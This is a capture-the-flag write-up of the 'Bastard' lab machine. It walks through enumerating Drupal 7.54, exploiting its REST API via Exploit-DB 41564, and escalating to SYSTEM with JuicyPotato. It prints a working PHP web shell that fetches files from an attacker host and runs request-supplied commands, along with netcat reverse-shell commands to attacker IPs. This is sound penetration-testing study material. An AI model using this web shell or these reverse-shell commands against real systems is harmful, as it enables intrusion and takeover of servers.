# Bastard

## Summary

* Only a few ports open: IIS on port 80 and MSRPC services on 135 and 49154.
* Detected Drupal 7.54 running on the webserver, confirmed with `droopescan`.
* Exploited Drupal REST API file upload vulnerability (CVE-2017-6347 via [exploit-db 41564](https://www.exploit-db.com/exploits/41564)).
* Gained a web shell by chaining file upload and remote execution logic into one payload.
* Delivered `nc64.exe` via HTTP and got reverse shell.
* Privilege escalation achieved using **JuicyPotato** with known CLSID for local privilege escalation.



***

## Enumeration

```bash
sudo nmap -sV -p- 10.10.10.9 -oA bastardNmap -T 5
```

**Nmap Output:**

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

* Navigating to `http://10.10.10.9/` revealed a default **Drupal 7** site.
* Discovered potential user IDs (`0`, `1`, and `5`) via enumeration.

**Droopescan Output**

```bash
droopescan scan drupal -u http://10.10.10.9
```

* Confirmed version: **Drupal 7.54**
* Detected modules: `ctools`, `libraries`, `services`
* Exposed `/CHANGELOG.txt`, `/user/login`

***

## Initial Foothold

1. Used [Exploit-DB 41564](https://www.exploit-db.com/exploits/41564), a **Drupal REST API RCE**, to upload a PHP web shell.
2. Modified exploit’s `$file` and `$phpCode` to:
   * Validate upload via test payload (`echo "Dhawan was here!"`)
   * Then swapped in the full reverse shell controller:

```php
<?php
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.18:8888/" . $_REQUEST['fupload']));
    };
    if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };
?>
```

3. Used this controller to upload `nc64.exe` and execute it:

```bash
http://10.10.10.9/vry4n.php?fupload=nc64.exe&fexec=nc64.exe -e cmd 10.10.14.12 7777
```

* **Reverse shell established!** 👏

***

## Privilege Escalation

Tried multiple methods (`GodPotato`, `PrintSpoofer`, post-exploit suggester), none worked.

Finally used **JuicyPotato** exploit with correct CLSID:

```bash
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.14.18 555" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

* Reverse shell on port 555 gave **SYSTEM access**.
